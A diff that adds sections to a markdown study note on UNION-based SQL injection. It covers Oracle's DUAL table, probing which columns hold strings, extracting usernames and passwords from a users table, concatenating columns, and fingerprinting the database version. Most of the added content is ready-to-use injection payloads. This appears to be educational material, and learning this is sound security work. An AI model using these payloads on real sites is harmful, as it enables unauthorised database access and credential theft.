@@ -65,3 +65,54 @@ The thing is null will match with any data types of the column, and in maximum c
 will give 200 status code.
 
 ```
+
+## **Database-specific syntax**
+
+```sql
+For oracle there is a built-in table, so we can use like this
+
+' UNION SELECT NULL FROM DUAL--
+
+-- should be followed by space.
+```
+
+### Finding column with specific database
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+
+there by we can identify which column has string data type.
+```
+
+### We can find username, pw once we know the respective column names, column data types and number of columns:
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+## **Retrieving multiple values within a single column**
+
+```sql
+' UNION SELECT username || '~' || password FROM users--
+
+-> Concatenating two columns.
+```
+
+## **Examining the database in SQL injection attacks**
+
+We need to find the version and type of db.
+
+The table and column names it contains.
+
+| Database type | Query |
+| --- | --- |
+| Microsoft, MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+```sql
+Sample code:
+
+'UNION SELECT @@version --
+```
